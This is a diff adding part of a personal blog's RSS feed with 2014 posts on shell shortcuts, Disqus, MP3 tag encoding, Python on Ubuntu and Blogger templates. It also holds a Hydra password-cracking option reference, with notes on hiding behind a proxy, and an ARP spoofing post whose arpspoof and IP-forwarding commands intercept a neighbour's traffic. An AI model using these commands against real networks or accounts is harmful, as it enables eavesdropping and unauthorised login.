+我要是再说具体方法就感觉多此一举了，要是想做就搜一下去吧，谷歌上有很多，也欢迎使用“我的”谷歌～
+一下午+半个晚上，就做了这点儿事儿。</description>
+    </item>
+    
+    <item>
+      <title>一些有用的command</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84command/</link>
+      <pubDate>Sat, 13 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84command/</guid>
+      <description>转载 + comments
+!$
+ !$ 代表上一个命令的最后一个字符串
+ 你可能会这样：
+$mkdir mydir $mv mydir yourdir $cd yourdir 可以改成：
+$mkdir mydir $mv !$ yourdir $cd !$  !! 代表上一条命令[与 !-1 等价] !-2 代表倒数第二条命令 !-3 代表倒数第三条命令 以此类推(其实完全可以按方向键搞定啊!!还有Ctrl+P!!)  cd –
+ 回到上一次的目录
+ 场景举例： 当前目录为/home/a，用cd ../b切换到/home/b。这时可以通过反复执行cd –命令在/home/a和/home/b之间来回方便的切换。 （注：cd ~ 是回到自己的Home目录，cd ~user，是进入某个用户的Home目录）详情打开 http://www.grymoire.com/Unix/Quote.html
+ALT+. or &amp;lt;ESC&amp;gt; + .
+ 热建alt+. 或 esc+. 可以把上次命令行的参数给重复出来。[注意,是参数哦~]
+ :w !sudo tee %
+ 在vi中保存一个只有root可以写的文件
+ &amp;gt; file.txt
+ 创建一个空文件，比touch短。(其实就是相当与把空格重定向给了一个文件&amp;hellip;)</description>
+    </item>
+    
+    <item>
+      <title>add disqus to github blog</title>
+      <link>https://wrfly.kfd.me/posts/add-disqus-to-github-blog/</link>
+      <pubDate>Thu, 11 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/add-disqus-to-github-blog/</guid>
+      <description>Disqus is an online comment script service. Blog or personal website often use it to let people comment their articals.
+Since I used others freamwork before, the disqus add-one is hers too.So I have to make a personal disqus for myself.
+It&amp;rsquo;s very easy.Just sigh in Disqus and click me.
+Simple easy,hum~</description>
+    </item>
+    
+    <item>
+      <title>my github</title>
+      <link>https://wrfly.kfd.me/posts/my-github/</link>
+      <pubDate>Sat, 06 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/my-github/</guid>
+      <description>just a hello word page
+&amp;amp;
+this blog framework is a copy of billie66
+thanks for her work~
+BUT NOW&amp;mdash;-I made a template for myself~ Just like this!</description>
+    </item>
+    
+    <item>
+      <title>关于ubuntu下MP3文件名乱码的问题</title>
+      <link>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8Eubuntu%E4%B8%8Bmp3%E6%96%87%E4%BB%B6%E5%90%8D%E4%B9%B1%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/</link>
+      <pubDate>Fri, 24 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8Eubuntu%E4%B8%8Bmp3%E6%96%87%E4%BB%B6%E5%90%8D%E4%B9%B1%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
+      <description>我是一个linux爱好者，用的是Ubuntu，然而在播放音乐的时候却发现从我的mp3里面复制的歌曲到了电脑里面都变成乱码了，下面的文字是我从《笨兔兔的故事》中复制出来的，完美的解决了我的问题，也会解决你的问题。
+话说一个 mp3 的歌名啊,作者啊,是记录在 mp3 标签里面的。这个标签的记录方式有很多中,主要是这么几个标准:ID3v1, ID3v2 2.3,ID3v2 2.4,APEv2。
+这个 ID3v1的标签支持 ISO-8859-1 编码,这是个国际通用的编码,但是很可惜,他是不支持中文的。到 ID3v22.3 这个版本开始,增加了对 utl-16 的支持,utf-16 也是一套国际通用的编码,这里面就包含中,日,韩等等各国的文字了。到 ID3v2.4,更增加了 utf-8 的支持。utf-8 和 utf-16 都是国际通用的一套编码,所不同的是 utf-8 以字节为编码单元,而 utf-16 用双字节为编码单元,这样就有大小端问题(也就是哪个字节先传输的问题,不知道的可以 google 一下)。
+因此总的来说,utf-8 相对更受欢迎一些。ID3v22.4 支持 utf8编码,可并没有说一定要用,只是可以用 utf-8,自然也可以用其他的编码。而 APEv2标准就不同了,它规定了其编码必须同一为 utf8 编码。ISO-8859-1,utf8,utf16,这些都是国际标准的编码。但 utf8,utf16 的出现都是后来的事情了,一开始,是没有国际标准的中文编码的,那时候只有国标——国家标准，也就是我们常见的 GB2312,GBK 和 GB18030。由于这些只是国家标准,所以开源软件的作者们(多数不是中国人)自然是忽略的这些标准(当然了,每个国家都有自己的标准,听谁的阿?)。所以,如果是用 ID3v1 或者 ID3v2 类型,并且使用国家标准编码的 mp3 文件,就会出现乱码。如果是 ID3v1 或 ID3v2 类型,但是使用 utf-8, 或者utf-16 编码的,就不会乱码。如果是使用 APEv2 标准的 mp3 文件,就更不会乱码了,因为 APEv2 必须用 utf8 嘛。
+然而事实是残酷的,事实就是:国内的大多数 mp3 都使用了国家标准编码。那我们在 Linux 下就看不到了么?当然不是,编码不对的话,转换一下就好了嘛。有个软件, 叫做 mid3iconv,他就认识各种编码,让他把 mp3 的编码改成 utf-8 的,就可以了。这个软件从哪里来?</description>
+    </item>
+    
+    <item>
+      <title>DO NOT UPDATE PYTHON ON UBUNTU</title>
+      <link>https://wrfly.kfd.me/posts/do-not-update-python-on-ubuntu/</link>
+      <pubDate>Tue, 07 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/do-not-update-python-on-ubuntu/</guid>
+      <description>or
+apt-get upgrade The fellows are what I did(including the reason and result. :(
+$./configure $make #make install But, it&amp;rsquo;s the beginning of my nightmare.
+My Goagent didn&amp;rsquo;t work.
+When I run python, it told me that I should install python-gevent and python-gtk2. But these two packages ware installed before! I can use it minutes ago! I didn&amp;rsquo;t study python before and I was puzzled. At first I think it&amp;rsquo;s the python3.</description>
+    </item>
+    
+    <item>
+      <title>hydra使用方法</title>
+      <link>https://wrfly.kfd.me/posts/hydra%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</link>
+      <pubDate>Tue, 07 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/hydra%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</guid>
+      <description>Hydra 破解登录密码 PS. 这篇文章不知道是从哪儿抄来的。。。2017-4-5
+格式：
+hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT] # 可选的-R 继续从上一次进度接着破解 -S 采用SSL链接（大写的S） -s PORT 如果非默认端口，可通过这个参数指定 -l LOGIN 小写，用于指定破解的用户，对特定用户破解 -L FILE 大写，用于指定用户的用户名字典 -p PASS 小写，用于指定密码破解，少用，一般是采用密码字典 -P FILE 大写，用于指定密码字典 -e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探 -C FILE 使用冒号分割格式 例如 “登录名:密码&amp;#34;来代替-L/-P参数 -M FILE 指定目标列表文件一行一条 -o FILE 指定结果输出文件 -f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解 -t TASKS 同时运行的线程数，默认为16 -w TIME 设置最大超时的时间，单位秒，默认是30s -v / -V 显示详细过程 server 目标ip service 指定服务名，支持如下: &amp;lt;br /&amp;gt;telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post date: 2014-10-07 title: hydra使用方法 cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener post date: 2014-10-07 title: hydra使用方法 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp OPT 可选项 如何使用代理服务器进行破解（这一点主要处于攻击者的ip，处于自身安全考虑） HYDRA_PROXY_HTTP 变量参数可以用来定义代理服务器(只能使用http代理) 语法:</description>
+    </item>
+    
+    <item>
+      <title>关于ARP欺骗</title>
+      <link>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8Earp%E6%AC%BA%E9%AA%97/</link>
+      <pubDate>Sat, 04 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8Earp%E6%AC%BA%E9%AA%97/</guid>
+      <description>本文科普一下ARP欺骗的一些知识，顺便教你怎样优雅的ARP欺骗。 What is ARP spoofing?
+1.什么是ARP欺骗 来自wikipedia上的解释是这样子的： &amp;gt; ARP欺骗（英语：ARP spoofing），又称ARP病毒（ARP poisoning）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术。此种攻击可让攻击者取得局域网上的数据数据包甚至可篡改数据包，且可让网络上特定电脑或所有电脑无法正常连接。 ARP欺骗的运作原理是由攻击者发送假的ARP数据包到网络上，尤其是送到网关上。其目的是要让送至特定的IP地址的流量被错误送到攻击者所取代的 地方。因此攻击者可将这些流量另行转送到真正的闸道（被动式数据包嗅探，passive sniffing）或是篡改后再转送（中间人攻击，man-in-the-middle attack）。攻击者亦可将ARP数据包导到不存在的MAC地址以达到阻断服务攻击的效果，例如netcut软件。
+例如某一网络闸道的IP地址是192.168.0.254，其MAC地址为00-11-22-33-44-55，网络上的电脑内ARP表会有这一笔ARP记录。攻击者发动攻击时，会大量发出已将192.168.0.254的MAC地址篡改为00-55-44-33-22-11的ARP数据包。那么网络上的电脑若将此伪造的ARP写入自身的ARP表后，电脑若要通过网络闸道连到其他电脑时，数据包将被导到00-55-44-33-22-11这个MAC地址，因此攻击者可从此MAC地址截收到数据包，可篡改后再送回真正的闸道，或是什么也不做，让网络无法连接。
+我的理解是这样的：
+我和小明在同一个局域网下，我对小明进行了arp欺骗，小明的数据就会到我的电脑上来。 首先我的电脑要把数据转发的功能打开，让小明的数据到我这里来以后，我还能给他发出去，也就是让小明能够正常上网，要不然小明就会生气。 在局域网内，网关是通过MAC地址识别电脑的，所以我就给网关发送消息，谎称我的mac地址是小明的mac地址，然后网关就会把小明的数据包发送给我，与此同时，我还要跟小明的电脑说，我的mac地址是网关的mac地址，你的数据包要发送给我，这样小明的数据也就流到我这里来了，我作为中间人，当然是有权利去查看这些数据的（要不然我攻击个毛）。
+2.怎样进行ARP欺骗 $sudo arpspoof -t 目标ip 网关ip $sudo arpspoof -t 网关ip 目标ip $sudo echo 1 &amp;gt;&amp;gt;/proc/sys/net/ipv4/ip_forward 具体解释如下： 第一句是让目标ip的mac地址指向本机ip，也就是网`让网关知道，目标ip的mac地址换了，换成我的了。 第二句是让网关知道，目标ip的mac地址是本机的mac地址。 第三句是在本地实现转发功能。
+这样就实现了让目标电脑的流量流经本机了。 然后在用wireshark抓个包啥的，我就不多说了。
+3.附注 本人才疏学浅，记性还不好，记不住这么多命令。于是就从网上找了个软件，一键搞定了。
+ettercap 这个软件就是个好东西了，用鼠标就能搞定一切，包括但不限于探测内网下所有主机，端口转发，流量监控。 有需要的同学可以自行google。
+最后，我要是说不能做坏事的话，那我就天真了，只是希望大家能做坏事做的优雅一些，别违背道德。</description>
+    </item>
+    
+    <item>
+      <title>去掉blogger博客中的Attribution</title>
+      <link>https://wrfly.kfd.me/posts/%E5%8E%BB%E6%8E%89blogger%E5%8D%9A%E5%AE%A2%E4%B8%AD%E7%9A%84attribution/</link>
+      <pubDate>Sat, 04 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%8E%BB%E6%8E%89blogger%E5%8D%9A%E5%AE%A2%E4%B8%AD%E7%9A%84attribution/</guid>
+      <description>所谓Attribution，就是blogger博客下面的“由Blogger强力驱动” 或者“ Simple template. Powered by Blogger. ”
+有些人会觉得烦，包括我，这篇帖子是教你怎样把页脚的Attribution去掉的。
+1.到 模板 → 修改html ### ![1/img/remove_attribution_in_blogger/remove_attribution_in_blogger.png)
+2.Ctrl + F 查找代码：### &amp;lt;b:widget id=&amp;#39;Attribution1&amp;#39; locked=&amp;#39;true&amp;#39; title: 去掉blogger博客中的Attribution ![2/img/remove_attribution_in_blogger/remove_attribution_in_blogger_2.png)
+3.找到之后，把 locked=&amp;lsquo;true&amp;rsquo; 改成 locked=&amp;lsquo;false&amp;rsquo;### ![3/img/remove_attribution_in_blogger/remove_attribution_in_blogger_3.png)
+4.保存### 5.删除### 点击 布局 → 页面元素 → 修改 Attribution → 点击删除 即可删掉“由Blogger强力驱动”
+![4/img/remove_attribution_in_blogger/remove_attribution_in_blogger_4.png)</description>
+    </item>
+    
+  </channel>
+</rss>
